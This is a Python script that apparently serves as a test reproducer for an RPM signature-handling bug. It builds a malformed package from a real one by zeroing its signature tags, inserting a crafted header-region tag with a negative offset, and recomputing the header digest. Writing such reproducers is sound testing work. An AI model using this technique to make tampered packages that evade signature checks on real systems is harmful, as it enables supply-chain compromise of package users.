#!/usr/bin/python3


# Credit for the original reproducer goes to Demi Marie Obenour: https://github.com/DemiMarie


# more info about the rpm file format:
# * https://rpm.org/devel_doc/file_format.html
# * https://github.com/rpm-software-management/rpm/blob/master/doc/manual/hregions.md
# * https://github.com/rpm-software-management/rpm/blob/master/doc/manual/signatures_digests.md


import hashlib
import os
import shutil
import struct
import sys

import rpm


# rpmtag.h - typedef enum rpmTagType_e
RPM_STRING_TYPE = 6
RPM_BIN_TYPE = 7


# constants used further in the code
SHA256_LENGTH = 65
TRAILER_LENGTH = 16


# Notes on file operations:
# * f_old/fd_old and f_new/fd_new share the low-level internals that's why any operations always affect both.
# * Sometimes it's important to flush writes to make the changes available in the other layer.


def main(argv):
    if len(argv) != 3:
        print('usage: gen_bad_rpm.py SOURCE OUTPUT\n', file=sys.stderr)
        sys.exit(1)

    input_path = argv[1]
    output_path = argv[2]

    ts = rpm.TransactionSet()
    ts.setVSFlags(rpm._RPMVSF_NOSIGNATURES | rpm._RPMVSF_NODIGESTS)

    with open(input_path, 'rb+') as f_old, open(output_path, 'wb+') as f_new:
        fd_old = f_old.fileno()
        fd_new = f_new.fileno()

        # read header from the original rpm
        old_hdr = ts.hdrFromFdno(fd_old)

        # rpm headers are immutable
        # to create a modified one, create a new one and copy the values over
        new_hdr = rpm.hdr()
        for tag in old_hdr:
            # if we don’t zero out rpm.RPMTAG_RSAHEADER and rpm.RPMTAG_DSAHEADER, the keys are copied
            # and libdnf later verifies them even if they sign different rpm header
            if tag in (rpm.RPMTAG_SIGPGP, rpm.RPMTAG_SIGGPG):
                contents = b'\0' * len(old_hdr[tag])
                new_hdr[tag] = contents
            else:
                try:
                    new_hdr[tag] = old_hdr[tag]
                except TypeError:
                    print("Error copying tag:", tag)

        # rpmlead.c, rpmlead.h
        # copy the rpm lead (96 bytes) from the original rpm
        rpm_lead = os.pread(fd_old, 96, 0)
        f_new.write(rpm_lead)

        # header.c
        rpm_header_magic = b'\x8e\xad\xe8\x01\x00\x00\x00\x00'
        f_new.write(rpm_header_magic)

        # headerutil.c - Binary types use size for data length, for other non-array types size must be 1.

        # write INDEXCOUNT and STORESIZE that determine count and size of tags in the current header
        f_new.write(struct.pack('>ii', 2, SHA256_LENGTH + TRAILER_LENGTH))

        # write INDEX entries (info about tags): (rpmtag, rpmtag_type, data_offset, data_size)
        # TODO(amatej): 62 is temporarily hardcoded, see commit message for more details.
        f_new.write(struct.pack('>iiii', 62, RPM_BIN_TYPE, SHA256_LENGTH, TRAILER_LENGTH))
        f_new.write(struct.pack('>iiii', rpm.RPMTAG_SHA256HEADER, RPM_STRING_TYPE, 0, 1))

        # write data to STORE

        # remember the sha256 checksum position and rewrite it with the actual checksum when it's computed
        # fill sha256 checksum with zeros for now
        sha256_position = f_new.tell()
        f_new.write(b'\0' * SHA256_LENGTH)

        # THIS IS THE ESSENTIAL PART OF THE REPRODUCER, WRITING DOWN BROKEN DATA THAT IS INCORRECTLY HANDLED BY RPM
        # the following tag is stored in STORE data indexed by rpm.RPMTAG_HEADERSIGNATURES above
        # TODO(amatej): 62 is temporarily hardcoded, see commit message for more details.
        f_new.write(struct.pack('>iiii', 62, RPM_BIN_TYPE, -TRAILER_LENGTH * 2, TRAILER_LENGTH))

        # remember the current position, we'll write rpm header here in the next steps
        hdr_start = f_new.tell()

        # align the header position, fill the new bytes with zeros
        if hdr_start % 8:
            f_new.write((8 - hdr_start % 8) * b'\0')
            hdr_start = f_new.tell()

        # write the modified header to the new rpm
        f_new.flush()
        new_hdr.write(fd_new)
        hdr_end = f_new.tell()

        # copy the payload
        # f_old is at the payload position already
        shutil.copyfileobj(f_old, f_new)
        f_new.flush()

        # compute and write sha256 checksum
        hash_obj = hashlib.sha256()
        hash_obj.update(os.pread(fd_new, hdr_end - hdr_start, hdr_start))
        f_new.seek(sha256_position)
        f_new.write(hash_obj.hexdigest().encode('ascii', 'strict'))

        # just make sure everything is on disk
        f_new.flush()


if __name__ == '__main__':
    main(sys.argv)
